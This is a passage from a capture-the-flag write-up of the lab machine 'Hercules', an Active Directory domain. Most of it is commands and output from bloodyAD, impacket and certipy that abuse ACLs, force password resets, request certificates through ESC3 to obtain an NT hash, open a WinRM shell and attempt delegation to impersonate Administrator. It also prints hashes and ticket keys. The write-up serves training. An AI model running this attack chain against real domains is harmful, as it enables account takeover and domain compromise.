[+] Password changed successfully!


impacket-getTGT hercules.htb/anthony.r:'newPassword@12' -k -dc-ip 10.10.11.91
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[*] Saving ticket in anthony.r.ccache


KRB5CCNAME=anthony.r.ccache bloodyAD -d hercules.htb --host dc.hercules.htb -k get writable --detail

distinguishedName: CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=hercules,DC=htb
url: WRITE
wWWHomePage: WRITE

distinguishedName: CN=Anthony Rudd,OU=Forest Migration,OU=DCHERCULES,DC=hercules,DC=htb
thumbnailPhoto: WRITE
pager: WRITE
mobile: WRITE
homePhone: WRITE
userSMIMECertificate: WRITE
msDS-ExternalDirectoryObjectId: WRITE
msDS-cloudExtensionAttribute20: WRITE
msDS-cloudExtensionAttribute19: WRITE
msDS-cloudExtensionAttribute18: WRITE

[SNIP]
```

Nothing interesting.

Checking the users in the `REMOTE MANAGEMENT USERS` group

![[Pasted_image_20251108060536.png]]

We find a user we have not come across so far, `ASHLEY.B` 

The user is a member of `IT SUPPORT` group 

![[Pasted_image_20251108060729.png]]

The group has `forceChangePassword` rights on some users

![[Pasted_image_20251108060919.png]]

But all the user's are in the 3 groups, `Domain Employees`, `Users`, `DOmain Users`.. dead end

Since the user is a member of `REMOTE MANAGEMENT USERS`, there is a chance there is a local privilege escalation vector. And we can get to the user from `FERNANDO.R` by exploiting `ESC3`

I guess you know the trend...

```bash
KRB5CCNAME=auditor.ccache bloodyAD -d hercules.htb --host dc.hercules.htb -k add genericAll "OU=Forest Migration,OU=DCHERCULES,DC=hercules,DC=htb" auditor
[+] auditor has now GenericAll on OU=Forest Migration,OU=DCHERCULES,DC=hercules,DC=htb

KRB5CCNAME=auditor.ccache bloodyAD -d hercules.htb --host dc.hercules.htb -k remove uac  -f ACCOUNTDISABLE
[-] ['ACCOUNTDISABLE'] property flags removed from anthony.r's' userAccountControl

KRB5CCNAME=auditor.ccache bloodyAD -d hercules.htb --host dc.hercules.htb -k set password fernando.r newPassword@12
[+] Password changed successfully!

impacket-getTGT hercules.htb/fernando.r:"newPassword@12" -k -no-pass -dc-ip 10.10.11.91
Impacket v0.14.0.dev0+20251022.130809.0ceec09d - Copyright Fortra, LLC and its affiliated companies

[*] Saving ticket in fernando.r.ccache


KRB5CCNAME=fernando.r.ccache certipy-ad req -u 'fernando.r@hercules.htb' -k -no-pass -dc-ip 10.10.11.91 -dc-host dc.hercules.htb -target 'dc.hercules.htb' -ca 'CA-HERCULES' -template 'EnrollmentAgentOffline'
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Request ID is 15
[*] Successfully requested certificate
[*] Got certificate without identity
[*] Certificate has no object SID
[*] Try using -sid to set the object SID or see the wiki for more details
[*] Saving certificate and private key to 'fernando.r.pfx'
[*] Wrote certificate and private key to 'fernando.r.pfx'
```

Then we request a certificate for `ASHLEY.B`

```bash
KRB5CCNAME=fernando.r.ccache certipy-ad req -u "fernando.r@hercules.htb" -k -no-pass -dc-ip "10.10.11.91" -dc-host dc.hercules.htb -target "dc.hercules.htb" -ca 'CA-HERCULES' -template "User" -pfx fernando.r.pfx -on-behalf-of "hercules\ashley.b" -dcom
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Requesting certificate via DCOM
[*] Request ID is 24
[*] Successfully requested certificate
[*] Got certificate with UPN 'ashley.b@hercules.htb'
[*] Certificate object SID is 'S-1-5-21-1889966460-2597381952-958560702-1135'
[*] Saving certificate and private key to 'ashley.b.pfx'
[*] Wrote certificate and private key to 'ashley.b.pfx'
```

Authenticate with the certificate to obtain NT hash for the user.

```bash
certipy-ad auth -pfx ashley.b.pfx -domain hercules.htb -dc-ip 10.10.11.91
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'ashley.b@hercules.htb'
[*]     Security Extension SID: 'S-1-5-21-1889966460-2597381952-958560702-1135'
[*] Using principal: 'ashley.b@hercules.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'ashley.b.ccache'
[*] Wrote credential cache to 'ashley.b.ccache'
[*] Trying to retrieve NT hash for 'ashley.b'
[*] Got hash for 'ashley.b@hercules.htb': aad3b435b51404eeaad3b435b51404ee:1e719fbfddd226da74f644eac9df7fd2
```


```bash
┌──(.evil-venv)─(darklight㉿ataraxia)-[~/…/machines/hercules/AD/winrmexec]
└─$ export KRB5CCNAME=ashley.b.ccache

┌──(.evil-venv)─(darklight㉿ataraxia)-[~/…/machines/hercules/AD/winrmexec]
└─$  python3 evil_winrmexec.py -ssl -port 5986 -k -no-pass dc.hercules.htb
[*] '-target_ip' not specified, using dc.hercules.htb
[*] '-url' not specified, using https://dc.hercules.htb:5986/wsman
[*] using domain and username from ccache: HERCULES.HTB\ashley.b
[*] '-spn' not specified, using HTTP/dc.hercules.htb@HERCULES.HTB

[snip]
```


Listing files in the user's home directory we get this.

```bash
PS C:\Users\ashley.b> tree /f .
Folder PATH listing
Volume serial number is 00000204 0A8A:BD1A
C:\USERS\ASHLEY.B
+---Desktop
¦   ¦   aCleanup.ps1
¦   ¦
¦   +---Mail
¦           RE_ashley.eml
¦
+---Documents
+---Downloads
+---Favorites
+---Links
+---Music
+---Pictures
+---Saved Games
+---Scripts
¦       cleanup.ps1
¦
+---Videos
```

We have an email and two scripts... Reading the mail i get this...


```
PS C:\Users\ashley.b\Desktop\mail> type RE_ashley.eml
--_004_MEYP282MB3102AC3B2MEYP282MB3102AUSP_
Content-Type: multipart/alternative;
	boundary="_000_MEYP282MB3102AC3E29FED8B2MEYP282MB3102AUSP_"

--_000_MEYP282MB3102AC3E2MEYP282MB3102AUSP_
Content-Type: text/plain; charset="us-ascii"
Content-Transfer-Encoding: quoted-printable

Hello Ashley,

The issue you are facing is that some members in the Department were once p=
art of sensitive groups which are blocking your permissions.

I've discussed your issue at length with security and here is a solution th=
at we feel works for both us and your team. I've attached a copy of the scr=
ipt your team should run to your home folder. For convenience, We have prov=
ided a shortcut to the script in the IT share. You may also run the task ma=
nually from powershell.

If you have any other issues feel free to inform me.

Regards, Domain Admins.

________________________________
From: Ashley Browne
Sent: Monday 09:49:37 AM
To: Domain Admins <Administrator@HERCULES.HTB>
Subject: Unable to reset user's password.

Good Morning,

Today one of my staff received a password reset request from a user, but fo=
r some reason they were unable to perform the action due to invalid permiss=
ions. I have double checked against another user and confirmed our team has=
permission to handle password changes in the department the user belongs to=
. I was told to contact you for further assistance.

For reference the user is "will.s" from the "Engineering Department" Unit.

I look forward to your reply.

Regards, Ashley.

--_000_MEYP282MB3102AC3E21A33MEYP282MB3102AUSP_
Content-Type: text/html; charset="us-ascii"
Content-Transfer-Encoding: quoted-printable
```

The mail talks about the issue we were facing when trying to enable `IIS_ADMINISTRATOR`,  `...which are blocking your permissions.` and there is an attached script for solving our problem.

Checking `aCleanup.ps1` script i get this...

```powershell
PS C:\Users\ashley.b\Desktop> type aCleanup.ps1
Start-ScheduledTask -TaskName "Password Cleanup"
```

It schedules a task.

Getting info about the task

```powershell
PS C:\Users\ashley.b\Desktop> Get-ScheduledTask -TaskName "Password Cleanup"


TaskPath                                       TaskName                          State
--------                                       --------                          -----
\                                              Password Cleanup                  Ready


PS C:\Users\ashley.b\Desktop> Get-ScheduledTaskInfo -TaskName "Password Cleanup"



LastRunTime        : 11/8/2025 9:13:13 AM
LastTaskResult     : 0
NextRunTime        :
NumberOfMissedRuns : 0
TaskName           : Password Cleanup
TaskPath           :
PSComputerName     :


PS C:\Users\ashley.b\Desktop> $task = Get-ScheduledTask -TaskName "Password Cleanup"
PS C:\Users\ashley.b\Desktop> $task.actions


Id               :
Arguments        : -File "C:\Users\Administrator\AppData\Local\Windows\Password Cleanup.ps1"
Execute          : powershell.exe
WorkingDirectory :
PSComputerName   :



PS C:\Users\ashley.b\Desktop> type "C:\Users\Administrator\AppData\Local\Windows\Password Cleanup.ps1"
Access is denied
Cannot find path 'C:\Users\Administrator\AppData\Local\Windows\Password Cleanup.ps1' because it does not exist.
```

We don't have the permission to read the script being executed by the scheduled task.

Reading the other script

```powershell
PS C:\Users\ashley.b\Desktop> type ../Scripts/cleanup.ps1
function CanPasswordChangeIn {
    param ($ace)
    if($ace.ActiveDirectoryRights -match "ExtendedRight|GenericAll"){
        return $true
    }
    return $false
}

function CanChangePassword {
    param ($target, $object)

    $acls = (Get-Acl -Path "AD:$target").Access
    foreach($ace in $acls){
        if(($ace.IdentityReference -eq $object) -and (CanPasswordChangeIn $ace)){
            return $true
        }
    }
    return $false
}

function CleanArtifacts {
    param($Object)

    Set-ADObject -Identity $Object -Clear "adminCount"
    $acl = Get-Acl -Path "AD:$Object"
    $acl.SetAccessRuleProtection($False, $False)
    Set-Acl -Path "AD:$Object" -AclObject $acl
}

$group = "HERCULES\IT Support"
$objects = (Get-ADObject -Filter * -SearchBase "OU=DCHERCULES,DC=HERCULES,DC=HTB").DistinguishedName
$Path = "C:\Users\ashley.b\Scripts\log.txt"
Set-Content -Path $Path -Value ""

foreach($object in $objects){
    if(CanChangePassword $object $group){
        $Members = (Get-ADObject -Filter * -SearchBase $object | Where-Object { $_.DistinguishedName -ne $object }).DistinguishedName

        foreach($DN in $Members){
            try {
                CleanArtifacts $DN
            }
            catch {
                $_.Exception.Message | Out-File $Path -Append
            }
            "Cleanup : $DN" | Out-File $Path -Append
        }
    }
}
```

I think this is a duplicate of the script `C:\Users\Administrator\AppData\Local\Windows\Password Cleanup.ps1`

Lets analyze it.

##### Function: `CanPasswordChangeIn`

Inspects an **Access Control Entry (ACE)** and returns true if the **ACE** includes `ExtendedRight` or `GenericAll`. In Active Directory, the ability to change a password is implemented as an `extended right`; `GenericAll` is a broad permission that implies full control. So this function is identifying ACEs that grant password-change capability.

##### Function: `CanChangePassword`

Given a target AD object (`$target`) and an identity (`$object`, e.g., the `HERCULES\IT Support group`), this function examines the target’s ACLs to see if the identity has an ACE that passes `CanPasswordChangeIn`. In plain terms: “*Can this group change the password of this object?*” If so, the function returns true.

##### Function: `CleanArtifacts`

this performs the actual “cleanup” on an AD object. It does three things:

- `Set-ADObject -Clear "adminCount"` — removes the `adminCoun`t attribute. `adminCount `is used by `AdminSDHolder `to mark objects that should be protected from normal ACL inheritance.

- `Get-Acl and SetAccessRuleProtection($False, $False)` — disables the protection that prevented inheritance and optionally removes explicit `ACL-only protection`; this re-enables the object to inherit ACLs from its parent OU. This is what will restore our ability to enable and reset the password for `IIS_ADMINISTRATOR`

- `Set-Acl` — writes the modified ACL back to the object.


The rest of the script does the following

1. Sets the variable `$group` to `HERCULES\IT Support` — the group whose rights are being checked.
2. Enumerates all objects under the `OU=DCHERCULES` search base.
3. Empties or creates the log file at `C:\Users\ashley.b\Scripts\log.txt`.
4. For each object under the OU:
    - If `HERCULES\IT Support` can change that object’s password (`CanChangePassword` returns true), then:
    - Enumerate child objects of that object and for each child call `CleanArtifacts` which clears `adminCount` and re-enables inheritance.
5. Log each cleanup or any exception message to the log file.

There is one more thing. Since we the group the group that is doing all this is `HERCULES\IT Support`,  we have to make sure the group has `GenericAll` rights over `FOREST MIGRATION` OU or more specifically `IIS_ADMINISTRATOR` so that we can be able to re-enable inheritance

Running the script without modifying any rights we see that `IIS_ADMINISTRATOR` is not among the users whose inheritance has been re-enabled 

```powershell
PS C:\Users\ashley.b\Desktop> ./aCleanup.ps1
PS C:\Users\ashley.b\Desktop> type ../Scripts/log.txt

Cleanup : CN=Will Smith,OU=Engineering Department,OU=DCHERCULES,DC=hercules,DC=htb

Cleanup : CN=Zeke Solomon,OU=Engineering Department,OU=DCHERCULES,DC=hercules,DC=htb

Cleanup : CN=Adriana Italia,OU=Engineering Department,OU=DCHERCULES,DC=hercules,DC=htb

Cleanup : CN=Tish Ckenvkitch,OU=Engineering Department,OU=DCHERCULES,DC=hercules,DC=htb

Cleanup : CN=Jennifer Ankton,OU=Engineering Department,OU=DCHERCULES,DC=hercules,DC=htb

Cleanup : CN=Shae Jones,OU=Engineering Department,OU=DCHERCULES,DC=hercules,DC=htb

Cleanup : CN=Joel Conwell,OU=Engineering Department,OU=DCHERCULES,DC=hercules,DC=htb

Cleanup : CN=Jacob Bentley,OU=Engineering Department,OU=DCHERCULES,DC=hercules,DC=htb
```


First we give the `IT SUPPORT` group `genericAll` writes on `FOREST MIGRATION` OU

```bash
┌──(.venv)─(darklight㉿ataraxia)-[~/…/machines/hercules/AD/powerview.py]
└─$ KRB5CCNAME=auditor.ccache bloodyAD -d hercules.htb --host dc.hercules.htb -k add genericAll "OU=Forest Migration,OU=DCHERCULES,DC=hercules,DC=htb" auditor
[+] auditor has now GenericAll on OU=Forest Migration,OU=DCHERCULES,DC=hercules,DC=htb

┌──(.venv)─(darklight㉿ataraxia)-[~/…/machines/hercules/AD/powerview.py]
└─$ KRB5CCNAME=auditor.ccache bloodyAD -d hercules.htb --host dc.hercules.htb -k add genericAll "OU=Forest Migration,OU=DCHERCULES,DC=hercules,DC=htb" "IT Support"
[+] IT Support has now GenericAll on OU=Forest Migration,OU=DCHERCULES,DC=hercules,DC=htb
```

Rerunning the script and reading the logs we get this 

```powershell
PS C:\Users\ashley.b\Desktop> ./aCleanup.ps1
PS C:\Users\ashley.b\Desktop> type ../Scripts/log.txt

Cleanup : CN=James Silver,OU=Forest Migration,OU=DCHERCULES,DC=hercules,DC=htb

Cleanup : CN=Anthony Rudd,OU=Forest Migration,OU=DCHERCULES,DC=hercules,DC=htb

Cleanup : CN=WINSRV01-2016,OU=Forest Migration,OU=DCHERCULES,DC=hercules,DC=htb

Cleanup : CN=WINSRV02-2016,OU=Forest Migration,OU=DCHERCULES,DC=hercules,DC=htb

Cleanup : CN=WINSRV03-2016,OU=Forest Migration,OU=DCHERCULES,DC=hercules,DC=htb

Cleanup : CN=ENTERPRISE01-8.1,OU=Forest Migration,OU=DCHERCULES,DC=hercules,DC=htb

Cleanup : CN=ENTERPRISE02-8.1,OU=Forest Migration,OU=DCHERCULES,DC=hercules,DC=htb

Cleanup : CN=Windows Computer Administrators,OU=Forest Migration,OU=DCHERCULES,DC=hercules,DC=htb

Cleanup : CN=IIS_Administrator,OU=Forest Migration,OU=DCHERCULES,DC=hercules,DC=htb

Cleanup : CN=Taylor Maxwell,OU=Forest Migration,OU=DCHERCULES,DC=hercules,DC=htb

Cleanup : CN=Fernando Rodriguez,OU=Forest Migration,OU=DCHERCULES,DC=hercules,DC=htb

Cleanup : CN=Will Smith,OU=Engineering Department,OU=DCHERCULES,DC=hercules,DC=htb

Cleanup : CN=Zeke Solomon,OU=Engineering Department,OU=DCHERCULES,DC=hercules,DC=htb

Cleanup : CN=Adriana Italia,OU=Engineering Department,OU=DCHERCULES,DC=hercules,DC=htb

Cleanup : CN=Tish Ckenvkitch,OU=Engineering Department,OU=DCHERCULES,DC=hercules,DC=htb

Cleanup : CN=Jennifer Ankton,OU=Engineering Department,OU=DCHERCULES,DC=hercules,DC=htb

Cleanup : CN=Shae Jones,OU=Engineering Department,OU=DCHERCULES,DC=hercules,DC=htb

Cleanup : CN=Joel Conwell,OU=Engineering Department,OU=DCHERCULES,DC=hercules,DC=htb

Cleanup : CN=Jacob Bentley,OU=Engineering Department,OU=DCHERCULES,DC=hercules,DC=htb
```


Now we see that inheritance has been re-enabled on `IIS_ADMINISTRATOR`

We then proceed to enable the account and change it's password 

```bash
┌──(.venv)─(darklight㉿ataraxia)-[~/…/machines/hercules/AD/powerview.py]
└─$ KRB5CCNAME=auditor.ccache bloodyAD -d hercules.htb --host dc.hercules.htb -k remove uac iis_administrator -f ACCOUNTDISABLE
[-] ['ACCOUNTDISABLE'] property flags removed from iis_administrator's' userAccountControl

┌──(.venv)─(darklight㉿ataraxia)-[~/…/machines/hercules/AD/powerview.py]
└─$ KRB5CCNAME=auditor.ccache bloodyAD -d hercules.htb --host dc.hercules.htb -k set password iis_administrator newPassword@12
[+] Password changed successfully!

┌──(.venv)─(darklight㉿ataraxia)-[~/…/machines/hercules/AD/powerview.py]
└─$ impacket-getTGT hercules.htb/iis_administrator:"newPassword@12" -k -dc-ip 10.10.11.91
Impacket v0.14.0.dev0+20251022.130809.0ceec09d - Copyright Fortra, LLC and its affiliated companies

[*] Saving ticket in iis_administrator.ccache
```

Guess that was the step we missed after all 🙂



`IIS_ADMINISTRATOR` has `forceChangepassword` rights on `IIS_WEBSERVER$` which has `allowedToAcl`, (RBCD), rights over the domain controller.

```bash
┌──(.venv)─(darklight㉿ataraxia)-[~/…/machines/hercules/AD/powerview.py]
└─$ KRB5CCNAME=iis_administrator.ccache bloodyAD -d hercules.htb --host dc.hercules.htb -k set password 'iis_webserver$' newPassword@12
[+] Password changed successfully!

┌──(.venv)─(darklight㉿ataraxia)-[~/…/machines/hercules/AD/powerview.py]
└─$ impacket-getTGT hercules.htb/"iis_webserver$":"newPassword@12" -k -dc-ip 10.10.11.91
Impacket v0.14.0.dev0+20251022.130809.0ceec09d - Copyright Fortra, LLC and its affiliated companies

[*] Saving ticket in iis_webserver$.ccache
```


trying to impersonate the `Administrator` we get this error

```bash
KRB5CCNAME=iis_webserver$.ccache impacket-getST -u2u -impersonate "Administrator" -spn "cifs/dc.hercules.htb" -k -no-pass 'hercules.htb'/'IIS_webserver$'
Impacket v0.14.0.dev0+20251022.130809.0ceec09d - Copyright Fortra, LLC and its affiliated companies

[*] Impersonating Administrator
[*] Requesting S4U2self+U2U
[*] Requesting S4U2Proxy
[-] Kerberos SessionError: KDC_ERR_BADOPTION(KDC cannot accommodate requested option)
[-] Probably SPN is not allowed to delegate by user IIS_webserver$ or initial TGT not forwardable
```


Checking the flags of the ticket we have this 


```bash
impacket-describeTicket iis_webserver$.ccache
Impacket v0.14.0.dev0+20251022.130809.0ceec09d - Copyright Fortra, LLC and its affiliated companies

[*] Number of credentials in cache: 1
[*] Parsing credential[0]:
[*] Ticket Session Key            : 09955eb5cd444e3ad422970f904100872d937d7aed7e34c24b9ecc67757539ed
[*] User Name                     : iis_webserver$
[*] User Realm                    : HERCULES.HTB
[*] Service Name                  : krbtgt/HERCULES.HTB
[*] Service Realm                 : HERCULES.HTB
[*] Start Time                    : 08/11/2025 08:22:46 AM
[*] End Time                      : 08/11/2025 18:22:46 PM
[*] RenewTill                     : 09/11/2025 08:22:45 AM
[*] Flags                         : (0x50e10000) forwardable, proxiable, renewable,initial, pre_authent, enc_pa_rep
[*] KeyType                       : aes256_cts_hmac_sha1_96
[*] Base64(key)                   : CZVetc1ETjrUIpcPkEEAhy2TfXrtfjTCS57MZ3V1Oe0=
[*] Decoding unencrypted data in credential[0]['ticket']:
[*]   Service Name                : krbtgt/HERCULES.HTB
[*]   Service Realm               : HERCULES.HTB
[*]   Encryption type             : aes256_cts_hmac_sha1_96 (etype 18)
[-] Could not find the correct encryption key! Ticket is encrypted with aes256_cts_hmac_sha1_96 (etype 18), but no keys/creds were supplied
```



